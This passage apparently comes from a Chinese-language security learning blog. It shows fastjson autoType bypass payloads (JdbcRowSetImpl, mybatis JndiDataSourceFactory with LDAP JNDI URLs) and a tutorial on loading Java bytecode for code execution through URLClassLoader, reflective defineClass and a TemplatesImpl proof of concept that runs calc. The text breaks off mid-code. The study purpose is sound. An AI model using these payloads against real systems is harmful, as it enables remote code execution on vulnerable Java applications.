src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424204641110.png" alt="image-20230424204641110"> </p><p>payload变成了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\[&quot;</span>dataSourceName\<span class="hljs-string">&quot;:\&quot;ldap://127.0.0.1:1389/foo\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>但仍然抛出一样的异常</p><p>通过调试发现出错误的点再DefaultJSONParser的parseArray函数处</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424205550350.png" alt="image-20230424205550350"> </p><p>发现因为我们的token是16，所以说会抛出异常</p><p>这里不知道怎么找token()的实现类，遂直接抄</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424210757498.png" alt="image-20230424210757498"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424211056228.png" alt="image-20230424211056228"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424211113519.png" alt="image-20230424211113519"> </p><p>成功</p><h3 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h3><p>修复了<code>[</code>的绕过，在<code>checkAutoType</code>中进行判断如果类名以<code>[</code>开始则直接抛出异常</p><h3 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h3><p>增加了黑名单，存在组件漏洞，需要有<code>mybatis</code>组件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">影响版本：<span class="hljs-number">1.2</span>.<span class="hljs-number">25</span> &lt;<span class="hljs-operator">=</span> fastjson &lt;<span class="hljs-operator">=</span> <span class="hljs-number">1.2</span>.<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>:&#123;<span class="hljs-string">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java中动态加载字节码的方法</title>
    <link href="/decemberus.com/2023/01/01/Java%E4%B8%AD%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <url>/decemberus.com/2023/01/01/Java%E4%B8%AD%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Java中动态加载字节码的方法"><a href="#Java中动态加载字节码的方法" class="headerlink" title="Java中动态加载字节码的方法"></a>Java中动态加载字节码的方法</h1><p>在yso的源码中，<code>Gadgets.createTemplatesImpl(command)</code>出现过很多次，下面来了解动态加载字节码的方法</p><h2 id="字节码含义"><a href="#字节码含义" class="headerlink" title="字节码含义"></a>字节码含义</h2><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p><p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。</p><p>甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215191228159.png" alt="image-20230215191228159"> </p><p>但是，本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内</p><h2 id="用URLClassLoader加载远程class文件"><a href="#用URLClassLoader加载远程class文件" class="headerlink" title="用URLClassLoader加载远程class文件"></a>用URLClassLoader加载远程class文件</h2><p>Java的ClassLoader来用来加载字节码文件最基础的方法</p><blockquote><p>ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。</p></blockquote><p>ClassLoader的概念的确不是一语概之的，所以我本文也不做深入分析，本文要说到的是这个ClassLoader： URLClassLoader 。</p><p>URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>以斜杠<code>/</code>结尾，且协议名不是file，则使用Loader来寻找类</li></ul><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。</p><p>用HTTP协议测试Java能否从HTTP服务器加载.class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">classloader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">Loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        Class c=Loader.loadClass(<span class="hljs-string">&quot;hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译一个简单的HelloWorld程序，放在 <code>http://localhost:8000/Hello.class</code> ：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230328223257756.png" alt="image-20230328223257756"> </p><p><img src="D:/mdimage/image-20230328224348499.png" alt="image-20230328224348499"> </p><p>我们发现他成功请求到了，但是java运行时的版本过低，我们换成jdk11（上面用的是jdk8）</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230328224637829.png" alt="image-20230328224637829"> </p><p>成功访问</p><blockquote><p>这里要注意，python启服务器的命令是在当前的目录下而不是默认的user目录</p></blockquote><p>成功请求到我们的 &#x2F;Hello.class 文件，并执行了文件里的字节码，输出了”Hello World”。</p><p>所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p><h2 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h2><p>上一节中我们认识到了如何利用URLClassLoader加载远程class文件，也就是字节码。其实，不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p><p><code>ClassLoader#loadClass</code>-&gt;<code>ClassLoader#findClass</code>-&gt;<code>ClassLoader#defineClass</code></p><ul><li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li><li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</li><li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p><p>我们可以编写一个简单的代码，来演示如何让系统的 defineClass 来直接加载字节码：</p><p>先介绍defineClass的利用方式</p><p>先写出下面简单的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TouchFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-comment">//System.out.println(&quot;HelloWorld&quot;)</span><br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>将上面的程序用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">javac TouchFile</span><br></code></pre></td></tr></table></figure><p>编译成字节码,并且用这一段代码来将其转化为Base64格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\CLassLoaderText\\src\\main\\java\\TouchFile.class&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(code);<br>        System.out.println(base64);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意，Path.get一定要绝对路径，相对路径并不可用</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402125149611.png" alt="image-20230402125149611"> </p><p>得到了我们想要的结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        Class hello=(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),<span class="hljs-string">&quot;Hello&quot;</span>,code,<span class="hljs-number">0</span>,code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p><code>Class hello=(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),&quot;Hello&quot;,code,0,code.length);</code> 的作用是通过反射机制，调用 <code>ClassLoader.defineClass</code> 方法将一个名为 “Hello” 的类加载到 JVM 中，并返回一个对应的 Class 对象。具体地，这行代码的作用如下：</p><ol><li>通过 <code>ClassLoader.getSystemClassLoader()</code> 获取系统类加载器对象。</li><li>调用 <code>defineClass</code> 方法，该方法是 ClassLoader 的一个 protected 方法，用于将字节数组转换为一个 Class 对象，并定义在 JVM 中。</li><li>方法的第一个参数是要定义的类的名称，这里为 “Hello”。</li><li>方法的第二个参数是一个字节数组，其中包含了要定义的类的字节码。</li><li>方法的第三个参数是一个整数，指定要解析字节码的起始偏移量。</li><li>方法的第四个参数是一个整数，指定要解析字节码的长度。</li><li>调用 <code>newInstance()</code> 方法创建一个 “Hello” 类的实例。</li></ol></blockquote><p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇中进行过说明），在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。</p><p>执行，输出Hello World:</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215204004203.png" alt="image-20230215204004203"> </p><p>这里有个注意点，decode里面是不能够加base64编码的东西的，乱加的话会出问题，这里实际上是字节码</p><p>这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。</p><p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。</p><h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类中定义了一个内部类<code>TransletClassLoader</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br><br>         TransletClassLoader(ClassLoader parent) &#123;<br>             <span class="hljs-built_in">super</span>(parent);<br>            _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>            <span class="hljs-built_in">super</span>(parent);<br>            _loadedExternalExtensionFunctions = mapEF;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>            Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>            <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>            <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>                ret = _loadedExternalExtensionFunctions.get(name);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>                ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>            &#125;<br>            <span class="hljs-keyword">return</span> ret;<br>         &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">         */</span><br>        Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里重写了defineClass，我们的目的就是调用这个defineClass。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215205636815.png" alt="image-20230215205636815"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215205822925.png" alt="image-20230215205822925"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215205842600.png" alt="image-20230215205842600"> </p><p>实际上这里已经是public了，外部可以调用了，不需要再次往上跟了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230215205904534.png" alt="image-20230215205904534"> </p><p>所以我们最终找到了getOutputProperties这个类</p><p>因此得到了一条完整的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<span class="hljs-comment">//设置成员变量的值</span><br>        obj.newTransformer();<span class="hljs-comment">//调用newTransformer来触发漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的setFieldValue是利用反射给私有属性赋值，这里设置了三个属性。</p><p><code>_bytecodes</code> 是由字节码组成的数组；<code>_name</code>可以是任意字符串，只要不为null即可； <code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl </code>对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</p><p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230216160237592.png" alt="image-20230216160237592"> </p><p>所以需要构造特殊类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<span class="hljs-comment">//通过</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    